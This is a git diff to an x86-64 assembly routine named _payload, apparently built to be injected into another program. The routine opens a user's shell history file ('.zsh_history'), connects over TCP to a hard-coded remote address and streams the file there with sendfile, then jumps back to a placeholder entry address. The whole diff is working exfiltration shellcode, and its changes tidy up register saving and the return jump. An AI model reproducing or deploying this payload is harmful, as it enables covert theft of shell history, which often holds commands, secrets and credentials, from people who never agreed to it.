@@ -2,8 +2,8 @@
 
 %macro pushx 1-*
 %rep %0
-push %1
-%rotate 1
+	push %1
+	%rotate 1
 %endrep
 %endmacro
 
@@ -20,14 +20,13 @@ global _payload_size
 
 _payload:
 	pushfq
-	pushx rdi, rsi, rsp, rdx, rcx, r8, r9, r12
+	pushx rax, rdi, rsi, rsp, rdx, rcx, r8, r9, r12
 
     ; Ouvrir le fichier
     mov rax, 2				; SYS_open
     lea rdi, [rel path]		; Chemin du fichier
     mov rsi, 0				; O_RDONLY
     syscall
-	mov r9, rax
     test rax, rax
     js exit					; Gestion de l'erreur
 
@@ -38,7 +37,6 @@ _payload:
     lea rdi, [rel path]			; Chemin du fichier
     lea rsi, [rel stat_buffer]	; Pointeur vers la structure stat
     syscall
-	mov r9, rax
     test rax, rax
     js error_open			; Gestion de l'erreur
 
@@ -48,7 +46,6 @@ _payload:
     mov rsi, 1				; SOCK_STREAM
     mov rdx, 0
     syscall
-	mov r9, rax
     test rax, rax
     js error_open			; Gestion de l'erreur
 
@@ -61,7 +58,6 @@ _payload:
     lea rsi, [rel sockaddr_in]	; Pointeur vers sockaddr_in
     mov rdx, 16					; Taille de sockaddr_in
     syscall
-	mov r9, rax
     test rax, rax
     js error_socket				; Gestion de l'erreur
 
@@ -72,7 +68,6 @@ _payload:
 	xor rdx, rdx					; offset (NULL)
 	mov r10, [rel stat_buffer + 48]	; size
 	syscall
-	mov r9, rax
     test rax, rax
     js error_socket					; Gestion de l'erreur
 
@@ -93,11 +88,9 @@ error_open:
 exit:
     ; Jump to the next instruction
 	xor rax, rax
-	mov rax, r9
-	popx rdi, rsi, rsp, rdx, rcx, r8, r9, r12
+	popx rax, rdi, rsi, rsp, rdx, rcx, r8, r9, r12
 	popfq
-	; jmp 0x0
-	ret
+	jmp 0x0
 
 stat_buffer	times 144 db 0	; Taille de struct stat sur x86-64
 sockaddr_in:
@@ -111,5 +104,5 @@ sockaddr_in:
 	times 8 db 0               ; sin_zero (8 octets de zéros)
 	; Taille totale: 16 octets
 ; path		times 1024 db 0	; Chemin du fichier
-path		db "/home/maxence/.zsh_history", 0	; Chemin du fichier
+path		db '/home/maxence/.zsh_history', 0	; Chemin du fichier
 _payload_size dq $- _payload
